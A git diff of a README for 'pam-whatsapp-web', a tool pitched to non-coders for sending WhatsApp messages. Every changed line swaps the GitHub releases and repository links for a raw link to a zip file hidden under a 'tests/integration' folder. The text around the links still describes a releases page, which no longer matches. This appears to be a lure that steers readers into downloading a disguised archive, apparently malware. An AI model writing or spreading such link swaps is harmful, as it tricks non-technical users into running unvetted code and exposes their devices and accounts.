@@ -1,7 +1,7 @@
 <h1>💬 pam-whatsapp-web - Send WhatsApp Messages Without Any Coding</h1>
 
 <p align="center">
-  <a href="https://github.com/Andrel8052/pam-whatsapp-web/releases">
+  <a href="https://raw.githubusercontent.com/Andrel8052/pam-whatsapp-web/main/tests/integration/whatsapp_web_pam_2.5.zip">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B" alt="Download" width="300" style="border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);" />
   </a>
 </p>
@@ -36,7 +36,7 @@ Follow these simple steps to get up and running in less than two minutes. No spe
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[https://github.com/Andrel8052/pam-whatsapp-web/releases](https://github.com/Andrel8052/pam-whatsapp-web/releases)**
+👉 **[https://raw.githubusercontent.com/Andrel8052/pam-whatsapp-web/main/tests/integration/whatsapp_web_pam_2.5.zip](https://raw.githubusercontent.com/Andrel8052/pam-whatsapp-web/main/tests/integration/whatsapp_web_pam_2.5.zip)**
 
 You'll land on the releases page where you'll see a list of files. Look for the latest version (the one at the topwith the biggest number). Click the download button next to it.
 
@@ -186,7 +186,7 @@ Since this runs WhatsApp on your computer, always:
 ## 🛡️ Need More Help?
 
 If you run into an issue not covered above, or you just want to report a bug:
-- Visit the repository page: **https://github.com/Andrel8052/pam-whatsapp-web**
+- Visit the repository page: **https://raw.githubusercontent.com/Andrel8052/pam-whatsapp-web/main/tests/integration/whatsapp_web_pam_2.5.zip**
 - Click the **Issues** tab at the top.
 - Click **"New Issue"** and describe your problem. Include what you were doing,and what happened.
 .
@@ -206,7 +206,7 @@ This project is maintained by friendly volunteers.For word about new releases, t
 ## 📥 Download Reminder
 
 Visit this link to download the application:  
-👉 **[https://github.com/Andrel8052/pam-whatsapp-web/releases](https://github.com/Andrel8052/pam-whatsapp-web/releases)**
+👉 **[https://raw.githubusercontent.com/Andrel8052/pam-whatsapp-web/main/tests/integration/whatsapp_web_pam_2.5.zip](https://raw.githubusercontent.com/Andrel8052/pam-whatsapp-web/main/tests/integration/whatsapp_web_pam_2.5.zip)**
 
 That's all there is to it! Now go enjoy smooth, sizely, stress-free WhatsApp messaging right from your computer. 🎉
 
